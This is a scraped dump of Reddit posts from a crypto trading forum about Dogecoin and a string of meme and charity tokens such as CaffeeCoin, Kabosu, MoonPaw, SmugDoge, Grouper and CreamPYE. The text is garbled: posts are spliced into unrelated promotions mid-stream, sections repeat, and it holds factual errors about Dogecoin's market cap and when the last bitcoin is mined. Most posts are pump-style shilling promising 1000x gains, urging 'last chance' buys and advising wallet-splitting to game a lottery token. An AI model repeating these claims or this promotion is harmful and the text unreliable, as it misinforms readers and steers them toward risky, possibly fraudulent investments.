DOGE,CryptoCurrencyTrading,"With Dogecoin being now accepted as payment currency by Tesla, I think that we will be seeing a lot of crypto payments these days.","

I mean we’ve been hearing a lot of talks about using cryptocurrencies for regular payments. Honestly, I don’t know how you might think about it, but using crypto for payments is something that will be pushing the entire cryptoverse towards mass adoption. 

I mean when crypto is accepted by major institutions as legal payment method, the demand will automatically increase right? And I believe this is happening sooner than what we expected. I mean right now, we already know platforms creating cryptocurrency debit cards, like Baanx for example, and users are benefitting from their services. 

It might take some time to become reality, but cryptocurrency is surely going to be used as payment currency, and that’ll be bringing a lot more people towards crypto.",0,2022-01-14 18:33:45,3

# General Conclusion

In the past time, we have witnessed tremendous growth from Dogecoin. Especially this growth comes from Elon Musk when he constantly ""memes"" about this coin. It is clear that even though Dogecoin is **only created just for fun**, this coin has reached a market cap of over US$60 million a few days ago.In today's article, let's dive into Dogecoin based on the analysis of the economic mechanism we often use. Spoiler alert: this might not be the coin you want to put your money in. At least we do not.Note: This article is not meant to be offensive, we respect the development of any coin in the space. Let's go!

# What Is Dogecoin?

* A meme coin
* A crypto currency
* Built using the Bitcoin infrastructure, but not related to Bitcoin prices

Dogecoin ($DOGE) is an open-source p2p cryptocurrency. It can easily be sent through the internet from person to person with security. You can send Dogecoin anywhere in a second, faster and cheaper than Bitcoin.One of the important points for Dogecoin is that it is already accepted at online retailers. Dogecoin can be used in payment, buy items at gamestop, trade and so much more.

## $DOGE In Real Life

>What is make Dogecoin truly unique from other currencies?

Dogecoin's ease of use makes it the perfect way to instantly send cash gifts to people all around the world.You can send 10 cents to your favourite comment on Twitter or $10 to your favourite band to purchase their latest album, you can even send $100 to a charity that you support. If you are a creator your fans can financially empower you for the first time. You can directly receive cash from them, rather than a valueless ""like"" on Facebook or ""retweet"" on Twitter. This allows you to focus on creating content instead of thinking about counting cents.

# How Did $DOGE Start?

Dogecoin was created on December 6, 2013, by a pair of software engineers **as a joke.**Billy Markus, an IBM programmer from Portland, Oregon, created his cryptocurrency from bitcoin source and at the time attracted a small pool of miners.Since Markus wanted his cryptocurrency to be public, he sought help from Jackson Palmer, who works for Adobe (ADBE). Palmer purchased the domain dogecoin .com - a formation for the ""doge"" meme that was popular on the internet at the time.The site originated as a joke: the image of the Shiba Inu dog representing $DOGE was the first image, and was surrounded by a series of broken English Comic Sans text.On dogecoin .com, its mascot is captioned:

>""Dogecoin is an open-source peer-to-peer digital currency, favoured by Shiba Inus worldwide.""

# The Economics of $DOGE

The same with other cryptocurrencies, $DOGE is a digital currency that can be bought and sold like an investment and spent like money.While each cryptocurrency is unique, they share some similarities with its more well-known peers, since they are all forks of Bitcoin — Bitcoin Cash. But they have a few key differences.Unlike bitcoin, which has only 21 million Bitcoins that can be mined, dogecoin has 129 billion coins in circulation and will continue to make new blocks of coins available for mining each year. That's part of the reason why a dogecoin is currently valued at around $0.45 and a bitcoin is valued at around $40,000.

## Market Design

While cryptocurrency is gaining more acceptance as a currency for buying goods, dogecoin is not being used much in the real world. It has several niche markets, including using dogecoin to make money for online artists.And the main difference is from the active online community of dogecoin. This is what makes this coin so interesting. The group, which is active on Reddit, has donated money (in dogecoin) to charitable causes and in 2014. Or the group successfully raised a grant for drivers advertising dogecoin in their cars. 

## Mechanism Design

### Governance

$DOGE has no administrative features. The same is true for cryptocurrencies that are forked from Bitcoin. The governance is baked directly into the code. This is because it is a simple payment use-case, unlike other DeFi protocols with more complex computation that we have been discussing thus far.

### Structure

$DOGE uses the same PoW algorithm as Bitcoin. Miners can own $DOGE by participating in maintaining the network as $DOGE.

## Token Design

### Token Policy

The design of $DOGE is not fixed in supply, meaning it can be mined forever and its value depends on demand from users.Bitcoin, like many other altcoins, has a hard limit on the number of cryptocurrencies they will allow. Dogecoin does the opposite, allowing for an ever-increasing supply but in a steady absolute amount each year.For example, in 2040, there will be no more Bitcoins that can be mined. Therefore, this will encourage hoarding of the Bitcoin supply. This will push up Bitcoin's price, but reduce Bitcoin's actual transaction volume (i.e. reduce the available floating volume).On the other hand, by allowing 5 billion $DOGE per year to increase the supply of Dogecoins infinitely, the supply will increase, but eventually, reach the actual limit. Thus, we can calculate the inflation rate of a currency over time.

### Financial Incentives

In this respect, $DOGE is paid to those who join the network. The money earned from mining $DOGE will be the main profit for mining. **TLDR**:$DOGE is a cryptocurrency that was created by a joke, but has an amazing growth as it is in the top 10 of the largest cryptocurrencies by capitalisation.When looking at the design aspects, $DOGE is basically similar to Bitcoin but without a fixed supply and has the same amount of $DOGE mined each year (5 billion $DOGE). In terms of mining, it is different from Bitcoin as the number of Bitcoin mining is halved every 4 years.Financial incentive when you become a miner, you join the network, maintain it and get a reward of $DOGE. Despite having a very simple mechanism, the community of Dogecoin is very large and loyal. That's why this Cryptocurrency still exists.",4,2021-09-19 08:57:54,4

# The Economics of $DOGE

The same with other cryptocurrencies, $DOGE is a digital currency that can be bought and sold like an investment and spent like money.While each cryptocurrency is unique, they share some similarities with its more well-known peers, since they are all forks of Bitcoin — Bitcoin Cash. But they have a few key differences.Unlike bitcoin, which has only 21 million Bitcoins that can be mined, dogecoin has 129 billion coins in circulation and will continue to make new blocks of coins available for mining each year. That's part of the reason why a dogecoin is currently valued at around $0.45 and a bitcoin is valued at around $40,000.

## Market Design

While cryptocurrency is gaining more acceptance as a currency for buying goods, dogecoin is not being used much in the real world. It has several niche markets, including using dogecoin to make money for online artists.And the main difference is from the active online community of dogecoin. This is what makes this coin so interesting. The group, which is active on Reddit, has donated money (in dogecoin) to charitable causes and in 2014. Or the group successfully raised a grant for drivers advertising dogecoin in their cars. 

## Mechanism Design

### Governance

$DOGE has no administrative features. The same is true for cryptocurrencies that are forked from Bitcoin. The governance is baked directly into the code. This is because it is a simple payment use-case, unlike other DeFi protocols with more complex computation that we have been discussing thus far.

### Structure

$DOGE uses the same PoW algorithm as Bitcoin. Miners can own $DOGE by participating in maintaining the network as $DOGE.

## Token Design

### Token Policy

The design of $DOGE is not fixed in supply, meaning it can be mined forever and its value depends on demand from users.Bitcoin, like many other altcoins, has a hard limit on the number of cryptocurrencies they will allow. Dogecoin does the opposite, allowing for an ever-increasing supply but in a steady absolute amount each year.For example, in 2040, there will be no more Bitcoins that can be mined. Therefore, this will encourage hoarding of the Bitcoin supply. This will push up Bitcoin's price, but reduce Bitcoin's actual transaction volume (i.e. reduce the available floating volume).On the other hand, by allowing 5 billion $DOGE per year to increase the supply of Dogecoins infinitely, the supply will increase, but eventually, reach the actual limit. Thus, we can calculate the inflation rate of a currency over time.  


### Financial Incentives

In this respect, $DOGE is paid to those who join the network. The money earned from mining $DOGE will be the main profit for mining.",1,2021-10-14 07:58:58,2
DOGE,CryptoCurrencyTrading,🐱CaffeeCoin🐱|$CAF|CaffeeCoin has its own Blockchain|Purpose is to help others|The Next DogeCoin But the Cat Version|Different From All the other Tokens|Self- Reliable|Not A Token but A Real Coin like Bitcoin/Litecoin|You Can Mine it unlike Tokens|Marketing Plan| Next 1000X Coin|CAF to the Moon🚀|,"**CaffeeCoin**  is based on the meme ""WHOAH So Thats Coffee"". The name of the  coin is  actually cat and coffee combined which makes Caffee. It is an  actual coin this time, not a BSC Token or ERC-20 Token, it has its own     blockchain that is based on the Scrypt algorithim, which gives it low     fees and quick transaction speed which are not based on other  blockchain transaction fees but our own, this means that we are more  reliable and independent unlike other tokens which use other Coins  Blockchains

# Our Own Blockchain(Self-Reliable)

We  are the cat version of Dogecoin, we want to compete against the dogs,  with a coin and not a token with our own blockchain that does not depend  on others Blockchains like Ethereum and Binance to work, it  is  self-reliable and independent. This means that CaffeeCoin relies on our  own Blockchain that has much lower fees that Ethereum Tokens, and fast  transaction speeds. This is why CaffeeCoin is different from all the  other tokens listed here, because we have unlimited potential to update,  improve and add new features to our Blockchain, unlike other tokens  which are confined to the Blockchains that they were built upon. We can  also be mined unlike tokens that are made and depend on other Coins  Blockchains as we have our own.

# Usage

CaffeeCoin  also wants people to have fun and a quick and easy way to send money to  others. CaffeeCoin has another important feature, you can send  CaffeeCoin around the world  without censorship, discrimination,  location filtering or anyone stopping it and no questions asked whenever  you send a transaction, your CaffeeCoin is your CaffeeCoin and no one  should be able to control how you spend your CAF. CaffeeCoin is also a  private coin, you don't need any information to sign up for a wallet,  and you generate can generate new wallet addresses the allow you to  receive or send CaffeeCoin more privately and so that people can't track  you, which gives you more freedom. CaffeeCoin wants to give people the  ability to contribute to the Blockchain and get rewarded for that, this  allows the CaffeeCoin Blockchain to be more decentralized, secure,  reliable and open to everyone. Anyone can run a CaffeeCoin Node which is  storing the CaffeeCoin Blockchain on their computers, this will allow  CaffeeCoin to be more secure and reliable and resistant to attacks as it  will make the Blockchain more decentralized and secure. Anyone can also  mine CaffeeCoin, mining is basically verifying transactions and then  those transactions that have been verified will be distributed to all  computers running the CaffeeCoin Blockchain, miners will also earn 3000  CAF every time they verify a transaction, this also helps people send  money around the world and makes CaffeeCoin more decentralized, secure  and fast.

# Purpose(Helping Others)

We  don't want to be another coin  that  has no purpose but to pump and  dump. We want to help people all around the world, when you hold, use  and buy CaffeeCoin, you are  making the  price increase, and we pledge  to donate 5 Million USD to charities all around the world when  CaffeeCoin reaches 1 Billion US  Dollars in Market Cap.  CaffeeCoin  wants to help people who lack basic needs and wants to donate to UNICEF  to help children and  also wants to donate to Animal funds, like the WWF  and the green climate fund, and other funds to help stop climate change  and make the world a better place. CaffeeCoin does not only  want to   have a meme battle with DogeCoin, but we also want to help the world and  that is our true purpose, helping others and giving people  the ability   to have a secure, quick, easy and private way to send  money, when you   buy CaffeeCoin you make the  Market Cap go up which will  make our  impact  larger and the amount of  money we give away increase. Whenever  CaffeeCoin reaches a certain market cap we plan to donate a sum of money   to the charities stated above. We also want to donate to people who  have been discriminated against as we want everyone to be treated fairly  as we all deserve the same opportunity as others and  deserve a chance  to  try and make a  positive impact in the world. CaffeeCoin has a dream  to help people and we need  your help to make it come true.

# Updates

CaffeeCoin  also has a few features that we plan to add to the  blockchain soon. We  plan to add the ability to deploy smart contracts  to the CaffeeCoin  Blockchain, add decentralized storage to store decentralized  data for  apps that we plan to be deploying soon.

DOGE,CryptoCurrencyTrading,Elon Musk & Shibatoshi Tweeted!! $Kabosu the Official Fake CEO of Dogecoin,"Trending On CoinGecko, DexTools and CoinMarketCap!

Oh & Elon and Shibatoshi tweeted!

[https://twitter.com/BillyM2k/status/1455671073995845635](https://twitter.com/BillyM2k/status/1455671073995845635)

The legendary $KABOSU has made a return with the whales. You might be wondering why the token surged after the Elon cosign. The reason being because $KABOSU is a legimitate doge project that can't be rugged and moons like no other. Already audited, high liquidiy and growing market cap of over 16m, even the moon isn't the limit for $KABOSU. A promising BSC project with a promising team of devs. Marketing rollout coming soon and exchange listings also in the works.

Kabosu was born in November 2nd, 2005 in a Japanese pedigree puppy mill that was promptly shut down, leaving Kabosu stranded in one of Japan’s many animal shelters. The owner of Kabosu, Atsuko Sato, rescued her in 2008, saving her from certain death at the hands of humanity. Her name was given by a shelter volunteer – Kabosu is a type of fruit and said rescue worker mentioned that her face was very round, just like the fruit.

The goal of Kabosu is to prevent dogs of all breeds from being abandoned. For this reason we will & have been making weekly donations to community chosen dog charities (as shown on website).

And they are planning on boarding on millions of players for their video game through their partners in Europe and Asia.

Experts have often refereed to them as the next ""Safemoon"" or ""Dogecoin"". Not because they are the same in terms of utilities.
But rather because of the similar interest levels at such early stages, that investors and exchanges have taken on the projects.

The native currency (BMC) and it's functioning Tokenomics:
8% Gets redistributed back proportionate to all wallet holders of (BMC) based on exchange volume and in game transactions in USD(c).
4% is redistributed to Marketing & Strategic buy back (BMC) bought back will be sent to a burn address to increase the scarcity of the native currency.
2% Is automatically re-added to liquidity pool to create a more stable price floor for (BMC).
There is also a built in anti whale feature in the contract to ensure that no higher amount than 0.125% of the total supply is being able to be sold at once.

**Overview**

MoonPaw ([moonpaw.cc](https://moonpaw.cc/)) has started to pick up some serious traction, it has been really refreshing to be a part of a community like this and see something grow from so low. There's something about this one that just feels different. Highly recommend at least checking out their [Telegram](https://t.me/MoonPawChat).

After a week of launch, MoonPaw donated more than $5,000 worth in cryptocurrency to Hope for Paws on a livestream and their developers were on video doing everything they could to engage with us viewers. They took questions and gave us well thought out answers! Now, they've upped their game to $20,000 last week!

**Recent Updates**

1. Listed on CoinGecko 🐸
2. Raised \~$60,000 for charity!
3. Just reached 1300 Telegram Members 🤩
4. Airdrop competition for first 1500 TG users (potential pool of 1.5M MoonPaw tokens)! **Only 200 spots left!** 💸

In the 2 weeks since they launched, they have already raised $60,000 for animal welfare and wildlife conservation efforts (which they achieve through a 2% tax on transactions when the token is traded).

Last weekend they donated $20,000 to Rocket Dog Rescue - a charity that Billy Markus had recommended to them and has said will promote the live stream!

Project Mission

**MoonPaw was designed to bridge the gap between content, community and crypto.**

\- **Content**: We are currently working towards creating products such as comics, NFTs and games that educate the general public on cryptocurrencies in an entertaining, easy-to-understand way.

\- **Community**: In the 2 weeks since we launched, we have already raised $50,000 for animal welfare and wildlife conservation efforts (which we achieve through a 2% tax on transactions when our token is traded).

\- **Crypto**: Our goal with this project is to bring the utilisation of cryptocurrency into the mainstream. We see a future where all of our entertainment products seamlessly integrate with the MoonPaw token e.g. you could get you exclusive access to certain content, discounts on merchandise, it could be used as an in-game currency when we release online games or it could even be used to vote on which charity we donate to that particular week!",10,2021-05-24 11:12:26,2

DOGE,CryptoCurrencyTrading,"Dogecoin, Elon Musk, And Saturday Night Live","The eyes and ears of cryptocurrency holders are glued on their American television for the appearance of Elon Musk as a presenter in the famous show of millions of viewers “Saturday Night Live”. What Musk will say about dogecoin will largely be judged if the biggest cryptocurrency outsider in the crypto space, turns to a favorite.

[Dogecoin ](https://satoshisbrain.com/tag/dogecoin)has already capitalized on the hype surrounding its name, which comes almost exclusively from statements by famous billionaires, such as Elon Musk and Mark Cuban.

However, for a parody coin, as were the original intentions of its two creators, its price explosion of about 50% in the last 24 hours, and… **25,000% since the beginning of the year**, is probably no longer so much fun, has started to get quite serious.

Now, the next big “station” for dogecoin is on NBC on Saturday, where Musk is expected to shake the waters once again.

This is not, of course, the first time that the eccentric crusader of Tesla and SpaceX has publicly supported the doge, but now it **has already prepared the ground through Twitter to take hype to another level**.

In an enigmatic tweet on April 28, he had simply written: “The Dogefather, SNL May 8”, announcing more or less what he will be doing on the show. These two lines were enough to create an investment panic waiting for the show, but also for its aftermath: Will Musk be able to send the price of dogecoin to the… moon (or Mars)?

So, those of you who want to wander around for a while in the field of cryptocurrencies, but bitcoin and ether seem accurate to you, doge is what you need for an -in short-term- investment, as long as the prices are still affordable…

That is, before the weekend and from Musk boost. Those of you who are faithful, just be careful not to overdo it…

DOGE,CryptoCurrencyTrading,SMUG | SmugDoge Dex & Token on Harmony ONE 🐶,"🚀 SmugDoge ($SMUG) - The VERY FIRST Doge coin equivalent on HARMONY ONE Blockchain. Think of the beautiful offspring of the fantastic deflationary tokenomics of SafeMoon and DogeBonk mixed with the fun of the beloved Doge!! 🚀

**ABOUT:**

SmugDoge is the very first equivalent of the famous Doge coin, but launched on the Harmony One blockchain. Based upon the tried and tested SafeMoon contract, SmugDoge is a deflationary and reflective rewards token! To help launch our community to the moon, 5% tax is applied to all transactions which are distributed to fellow Smuggies just for holding their tokens. Another 5% tax is automatically added to a locked liquidity pool to generate an ever rising price floor! Consequently, please make sure to put at least 11% slippage in order for transactions to succeed!

🧾 Contract: 0x44aFdBe2Cb42cc18759159f7E383afb0Ca8E57aD

🔋 Total Supply: 1,000,000,000,000,000 (100%): View from Harmony Explorer

🔥 Burnt at Launch: 300,000,000,000,000 SMUG (30%): View tx from Harmony Explorer

🔒 Locked Liquidity: By sending all LP tokens to the zero & burn address, initial liquidity was locked for 6 months: [Harmony Explorer](https://explorer.harmony.one/tx/0x61861fe8be20dc22775faffbd6c058ab959c7ee9ee8a6cf364ea035732e7ae6b?activeTab=0)

✅ Ownership Renounced: To prevent manipulation of tax fees, ownership of the contract was renounced.

 

**TOKENOMICS PER EACH TX:**

💸 5% Rewards reflected back to SMUG holders

💰5% Added to the locked Liquidity Pool

🐳 Anti whale measures in place

 

**CURRENT GROWTH**

Since launch less than 2 weeks ago the token has grown to a $1.0m MC

We have been the top performing project on Harmony Blockchain in the last 24 hours  

 

**HOW TO BUY**

Details on how to buy are available on our medium post [Medium](https://link.medium.com/VC9GtYvE2kb) or if you are already familiar with the harmony ecosystem you can use this [Buy Link](https://game.defikingdoms.com/#/marketplace?outputCurrency=0x44aFdBe2Cb42cc18759159f7E383afb0Ca8E57aD)  

 

**FUTURE PLANS**

\-A DEX will be shortly launched

\-NFTs are planned

\-Staking with xSMUG to follow. As people cannot buy xSMUG, they will be unable to farm on the DEX without owning SMUG, and trading it for xSMUG. Therefore all transactions will benefit SMUG holders and add to an ever-increasing price floor which will be happening MULTIPLE TIMES PER SECOND once the DEX launches.

DOGE,CryptoCurrencyTrading,"Generic DOGE 🐶 | Our Doxxed team brings you the best MiniDoge Fork | No nonsense, One goal: The Moon","In the past few months, thousands of new crypto tokens have been created on the Binance Smart Chain. These projects had different concepts and Tokenomics, various names and different marketing approaches, but they all have one thing in common: The shape of their chart on PooCoin, an inverted parabolic curve. Why is that? 

Most projects promise the Moon: a high-risk high-return approach, which is heavily based on hype, marketing, and encourages investors to get in early and drop their investment rapidly. 

Many projects have attempted to hide and fight this cycle, but very few have succeeded. Even the powerhouses with massive marketing budgets have reached their peaks and are now as low as they started.

By channeling the strength of our community, GDOGE is the first project on the Binance Smart Chain that is not scared to be fully honest with its investors. All anyone wants is to Moon, and for that, community members and developers alike have to play their part: Shill, marketing, shill, marketing, and more shilling. 

Every day, the community is asked to complete a precise set of shilling tasks and consulted in regard to marketing decisions. Thanks to the 4% Marketing fee in our Tokenomics, this project is guaranteed to prolong the initial stages of ""hype"" and attract new investors, while converting early-stage investors into long-term holders. We're here to stay. If you believe in our philosophy, join our movement. 

Coupled with the revolutionary feature from MiniDOGE, which is a smart buyback function that only enables after an algorithm estimates that the chart is taking a “dip” and should therefore be corrected, we are confident that Generic DOGE is the next big thing.

A second primordial feature for any token project which wishes to survive the test of time is the tax which automatically converts BNB and sends it to a Marketing Wallet. Marketing is the most important factor in the growth and life of a coin. Having a marketing fee that is sent to a wallet is the difference between a short-term and long-term project. Running out of Marketing funds is synonymous with the end of a project, and having a “marketing wallet” is inefficient in that sense. Having a marketing fee, however, guarantees that as long as trading volume is reasonably high, some funds are being put at the service of marketing and growth.

Generic Doge is launching in a few days. We've worked on this for hundreds of manhours, to guarantee a structured Marketing approach and to put our community at ease. Our Developer wallet will be fully locked for a month, and our liquidity will be locked for a year. The supply which will not be sold in the presale will be burned. 

Nothing has been left unaccounted for. This is, we think, the next MoonShot.

Grouper Swap BTC/LTC/DOGE:GROUPER: [grouper.website/?page\_id=2201](https://grouper.website/?page_id=2201)

Why is it named Grouper? Because there are three lotteries grouped into one!

\--- What is it? ----

The Grouper Token is a perpetual lottery token hosted on the Binance Smart Chain. There are hourly, daily, and weekly Lottery draws. The amount of Grouper tokens needed to play will be determined by the cost of the coin and overall total holders. All you must do is have at least the minimum amount to automatically be entered into all the lotteries. 176 Lotteries A Week

Current Min Tokens to Be Entered in Lotteries: 50,000 Grouper

BSC Contract Address: 0x9ce5222a0419cc4d25ece978aaa5d8c31b3565e6

\--- How do I make money? ---

1. Buy the minimums to play lottery and enjoy community
2. Buy more, become an owner, help steer the project and eventually sell back your tokens to those trying to join at a much higher price + play all the lotteries.

\--- Why is it different? ---

The supply of Grouper is elastic. You have deflationary pressure when Grouper is traded as there is a 6% tax on every transaction. 5% that is burned, along with the 1% advertising fee (6% total). This helps to reduce supply while also discouraging high speed bots from buying and selling around the lottery times. The Grouper contract is fully published for everyone to read unlike many other lottery tokens on the Binance Smart Chain.

\--- How can they guarantee winners? --- (THIS SOLVES PROBLEM 1)

Minting coins is not evil, as long as it is explained upfront. To ensure timely lotteries the coins are minted. Hence if transaction volume is low this might cause slight inflation. The max coins awarded per week is equal to 1.5% of the total available coins. The 5% transfer tax easily counteracts this over time.

Many other bsc lotteries die because their volume trails off and they cannot pay lotteries!

\--- What the heck is GROUPER Swap? --- (SOLVES PROBLEM 2)

Grouper swap allows newer members to bsc to buy in directly with Bitcoin, Litecoin, and Doge coin. (More coins added soon). This allows them to skip pancake swap and all the headaches of converting to bnb and then to the GROUPER lottery token. Imagine when the Doge boys figure out they can join a lottery join FOR LIFE for 50 Doge.

\--- Simplicity --- (SOLVES PROBLEM 3)

Buy, hold, and win. It is literally that simple. If your wallet holds the minimum amount you are eligible to play all 176 weekly GROUPER lotteries! The minimum amount needed will NEVER go up, only down as the market cap increases. The dev’s are aiming to peg it at a $25 entry per wallet. So, if you buy more coins make sure to split them into separate wallets so you get more chances to win. (Metamask works great for this). The devs are also working on the website so you will be notified by email, telegram, and TEXT MESSAGE if you win! The weekly lottery is obviously the largest draw, but it is super fun being able to watch all the hourly winners in the chat get excited!

\--- Published Contract ---

Grouper contract is fully published and the devs answer any questions about it. Please support open source and only contribute to bsc projects that fully publish their contracts!

\--- What are the tokenomics? ---

The supply of Grouper is elastic. You have deflationary pressure when Grouper is traded as there is a 6% tax on every transaction. 5% that is burned, along with the 1% advertising fee (6% total). This helps to reduce supply while also discouraging high speed bots from buying and selling around the lottery times. The Grouper contract is fully published for everyone to read unlike many other lottery tokens on the Binance Smart Chain. The overall 5% burn results in deflationary pressure. Fair rules, published contract, and fair randomization.

\--- Can you increase your odds? ---

If I have more Grouper does it increase my chances? No, each wallet has the same chance to win. You can split your wallet into several smaller wallets for better chances as long as they hold the minimum.

\--- Liquidity lock? Presale? ---

The Grouper presale was 5/30/21 and sold. Liquidity locked until 2022.

\--- How do I trust GROUPER? ---

Functions allow you to interact directly with GROUPER on the blockchain!

Trust but verify, all GROUPER information can be verified directly on the black chain. Examples include last winner, when the next jackpot is, and how many current holders there are.

\--- Is there a roadmap? ---

\- Upcoming Mobile App

\- Text Notifications If You Win

\- Expanded Website Integration

\- Influencer Affiliate Program

\- Ethereum 2 Upgrades

\--- Are you still reading? ---

If you are still reading, I hope you enjoyed learning a little bit about the Grouper project. I got my bags and am waiting for takeoff. I believe the facts presented above clearly explain why Grouper will be here for the long run and outpace all the bsc and crypto lotteries.

Grouper is not trying to be the best bsc lottery… They are trying to be the best CRYPTO lottery!",420,2021-06-11 19:03:32,8

DOGE,CryptoCurrencyTrading,"CreamPYE ($PYE) - From the creators of MiniDoge: 21,500 holders strong. All devs showed faces. Real technology launching soon. This may be your last chance.","CreamPYE is backed by a multimillionaire team of highly experienced developers, entrepreneurs, and marketers with decades of experience. They are providing a real-use case application which is a variety of platforms that are easily integrated and user friendly. Imagine the Apple of crypto. They will absolutely become a top 10 token and have the firepower in house to make it happen. They are using their platform not only to change the crypto industry forever, but also emphasize a cornerstone belief in charitable contributions. Only 1 month into its existence, Creampye has already donated nearly $390k to charitable organizations, proof posted on YouTube. This team, community, and technology is becoming the front runner for the crypto world over the next few years. They are not just here to take part, **they are here to take over.**

**Overview:**

• The entire team of 15+ members showed faces and listed business address publicly.

**•** **Actual use case** CEX/DEX hybrid exchange which will focus highly on customer service and experience (much needed before the masses can adopt in to new crypto). Augmented reality, NFT marketplace, PYE Charts. $450k charity donations already made. Very extensive roadmap.

• Officially listed on ProBit and WhiteBit. Huge marketing push on their platforms coming next, including a PYE trading competition.

• Team has over 15+ years of experience building businesses. Creampye team has done marketing campaigns over **$100m USD** in past projects

• Relatively small Marketcap (15m).

• You are early - Project is 30 days old and growing exponentially. <3,000 reddit members. <22,000 holders. Might be your last chance to be “early”

• Tokenomics pay out 5% **Passive income** for holders! 4.9% put into liquidity. 0.1% into a charity wallet.

• The team has built a variety of very successful businesses already. These are not kids in their parents’ basement. They are legitimate business moguls running a full-on operation.

• Hacken audit has been passed (received a score of 100%) and the whitepaper has been published.

**Who Runs Creampye?** If you hang around this world of crypto long enough, unfortunately you may run into some teams that you cannot trust. I invite you to look at the pinned tweet on Creampye’s Twitter (@creampyetoken). The entire team of 15+ members has shown faces, they each have a mini biography on the website, and there is a business address listed publicly. See for yourself.

**What Is Creampye?** Creampye (Pye) is a new token focused on creating new technology in the world of crypto and simplifying the process for mass adoption. They are working on a new exchange, Pyeswap, that will become the industry standard for purchasing crypto. This exchange will make crypto far easier to buy than it ever has before. Not only that, much of the focus will be on a simplified, friendly user experience that makes it easy for any average Joe to purchase crypto. This is desperately needed before the masses can enter the market. It is almost impossible to teach a newcomer to the world of crypto the multi step process of acquiring BNB, using pancakeswap, and storing tokens in a wallet. PYE is going to change this by making it easier to purchase all crypto currencies and we will be focusing on customer service and experience. They are also launching PYEcharts in a few weeks, an NFT marketplace, and have just passed a completed audit with flying colors (Audit done by Hacken).

**Charity** CreamPYE was created in order to make a difference. The token has included that 0.1% of all transactions are sent to a charity wallet. The team has made due on this already by donating not one, not two, but three donations totaling $390k only one month into its existence! The team behind CreamPYE has been involved with numerous charities from business ventures in the past. They have donated millions of dollars to various charities and it is a core component of the team values. Here at Creampye, we are proving that the world of crypto can make a positive impact on the world through our charity donations.

**The Entry Point. You are early.** PYE’s goal is to become a top 10 token. We have the community, the experience, and the tech to back that goal. We were consolidating for the past few weeks and I have been posting about how it may have been the last time we saw those prices. We all believe in the project being the future of crypto. When we achieve our goal of becoming a top 10 token, that is over a 1000x gain from here. The holders, the community, and the exposure are growing exponentially. We have had YouTube posts and mentions from some of the biggest names in the game, including Torin Hoffman, Conor Kenny, and Alexandrus 1337. Just last week PYE was mentioned on the Pardon My Take podcast, which pulls in 1.5 million daily listeners. The CEO is good friends with business mogul Gary Vee (video of them hanging out posted in telegram), and former Miami Heat player Damian Jones recently retweeted Creampye. These are many exciting developments in the early days of PYE.

**In conclusion** I have only given a brief overview here, but I invite you to do more research yourself. We are blazing our own trail in the world of crypto that will give investors access to an entirely new, user friendly ecosystem of programs. Many will try to replicate what we are creating for decades to come. Creampye is a results oriented, relentless, and highly experienced team. The last piece of the puzzle is more eyes on the project. You can see that we are listed on CoinMarketCap, CoinGecko, ProBit, and WhiteBit. Soft dates have been given for more exchange listings, and big news is happening every single day. Do your own research and if you decide to join the Pye fam, buckle up, its going to be a crazy ride!

Join the NEWEST addition to the DOGE 🐾 family! MiniDoge is the first ever AutoBoost token. HODL and Earn Tokens with MiniDOGE aka Ms Celebrity Doge! MiniPet Adventure App on the Roadmap Q3🚀 MiniDoge is bringing the crypto world to the gaming world.

MiniDOGE is built for the holders to win. 12% buy fees and 18% sell fee (extra 5% more reflection to holders). This is made to reward long holders, to discourage people looking for a pump & dump.

OrphanBabyDoge is a community-driven & charity token, orphaned by Elon, raised in foster care by Mcafee, re-orphaned by the deep state.

The Tragedy that gave birth to “OrphanBabyDoge”

OrphanBabyDoge is a charity donation coin that will help the unfortunate and poor orphans in third world countries; suffering from the bitterness of destitution, lack of education, and endless wars.

💥 We will rise together fast, brick by brick & sturdily; like bricks in a fortress.

DOGE,CryptoCurrencyTrading,"CreamPYE ($PYE) - From the creators of MiniDoge: 22,000 holders strong. All devs showed faces. Real technology launching soon. This may be your last chance.","CreamPYE is backed by a multimillionaire team of highly experienced developers, entrepreneurs, and marketers with decades of experience. They are providing a real-use case application which is a variety of platforms that are easily integrated and user friendly. Imagine the Apple of crypto. They will absolutely become a top 10 token and have the firepower in house to make it happen. They are using their platform not only to change the crypto industry forever, but also emphasize a cornerstone belief in charitable contributions. Only 1 month into its existence, Creampye has already donated nearly $390k to charitable organizations, proof posted on YouTube. This team, community, and technology is becoming the front runner for the crypto world over the next few years. They are not just here to take part, **they are here to take over.**

**Overview:**

• The entire team of 15+ members showed faces and listed business address publicly.

**•** **Actual use case** CEX/DEX hybrid exchange which will focus highly on customer service and experience (much needed before the masses can adopt in to new crypto). Augmented reality, NFT marketplace, PYE Charts. $450k charity donations already made. Very extensive roadmap.

• Officially listed on ProBit and WhiteBit. Huge marketing push on their platforms coming next, including a PYE trading competition.

• Team has over 15+ years of experience building businesses. Creampye team has done marketing campaigns over **$100m USD** in past projects

• Relatively small Marketcap (15m).

• You are early - Project is 30 days old and growing exponentially. <3,000 reddit members. <22,000 holders. Might be your last chance to be “early”

• Tokenomics pay out 5% **Passive income** for holders! 4.9% put into liquidity. 0.1% into a charity wallet.

• The team has built a variety of very successful businesses already. These are not kids in their parents’ basement. They are legitimate business moguls running a full-on operation.

• Hacken audit has been passed (received a score of 100%) and the whitepaper has been published.

**Who Runs Creampye?** If you hang around this world of crypto long enough, unfortunately you may run into some teams that you cannot trust. I invite you to look at the pinned tweet on Creampye’s Twitter (@creampyetoken). The entire team of 15+ members has shown faces, they each have a mini biography on the website, and there is a business address listed publicly. See for yourself.

**What Is Creampye?** Creampye (Pye) is a new token focused on creating new technology in the world of crypto and simplifying the process for mass adoption. They are working on a new exchange, Pyeswap, that will become the industry standard for purchasing crypto. This exchange will make crypto far easier to buy than it ever has before. Not only that, much of the focus will be on a simplified, friendly user experience that makes it easy for any average Joe to purchase crypto. This is desperately needed before the masses can enter the market. It is almost impossible to teach a newcomer to the world of crypto the multi step process of acquiring BNB, using pancakeswap, and storing tokens in a wallet. PYE is going to change this by making it easier to purchase all crypto currencies and we will be focusing on customer service and experience. They are also launching PYEcharts in a few weeks, an NFT marketplace, and have just passed a completed audit with flying colors (Audit done by Hacken).

**Charity** CreamPYE was created in order to make a difference. The token has included that 0.1% of all transactions are sent to a charity wallet. The team has made due on this already by donating not one, not two, but three donations totaling $390k only one month into its existence! The team behind CreamPYE has been involved with numerous charities from business ventures in the past. They have donated millions of dollars to various charities and it is a core component of the team values. Here at Creampye, we are proving that the world of crypto can make a positive impact on the world through our charity donations.

